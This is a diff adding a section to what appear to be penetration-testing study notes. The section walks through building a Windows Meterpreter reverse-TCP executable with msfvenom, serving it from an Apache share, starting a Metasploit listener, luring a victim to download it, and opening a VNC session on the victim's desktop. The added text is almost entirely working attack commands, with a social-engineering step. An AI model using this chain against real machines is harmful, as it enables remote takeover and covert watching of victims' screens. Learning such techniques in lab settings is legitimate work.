@@ -47,11 +47,40 @@ Then, if any user account names are missing, complete them looking at the result
 4. Choose Audit Type: Strong Password Audit (Quick PA, Common PA, Thorough PA)
 
 
+- - - -
 
+## Exploiting Client Side Vulnerabilities and Establishing a VNC Session ##
 
+### msfvenom ###
+``` msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=<Attacker Listener IP - Ex. 10.10.10.11> LPORT=<Attacker Open Listener Port - Ex. 444> -o <Output File - Ex. /root/Desktop/reverse-test.exe> ``` - Creating an exploit: Reverse TCP shell malicious _exe_ file
 
+### Creating a Directory to Share with the Victim ###
+1. ``` mkdir /var/www/html/share ```
+2. ``` chmod -R 755 /var/www/html/share ```
+3. ``` chown -R www-data:www-data /var/www/html/share ```
+4. ``` mv /root/Desktop/reverse-test.exe /var/www/html/share ``` - Moving the malicious file to the shared folder
 
+### Starting the Apache Server ###
+``` service apache2 start ```
 
+### Metasploit ###
+``` msfconsole ```
+
+Steps to set up a listener:
+1. ``` use multi/handler ```
+2. ``` set payload windows/meterpreter/reverse_tcp ```
+3. ``` set LHOST <Attacker Listener IP> ```
+4. ``` set LPORT <Attacker Listener Port> ```
+5. ``` exploit ```
+
+### Luring the Victim ###
+Now, the attacker should lure the victim to access: ```http://<Attacker IP>/share``` and download the ```reverse-test.exe``` file.
+
+### Metasploit ###
+If Meterpreter does not start automatically interacting with the victim, type: ``` sessions -i 1 ```.
+
+1. ``` run vnc ``` - To start a VNC session with the victim
+2. The victim's Desktop screen will appear
 
 
 
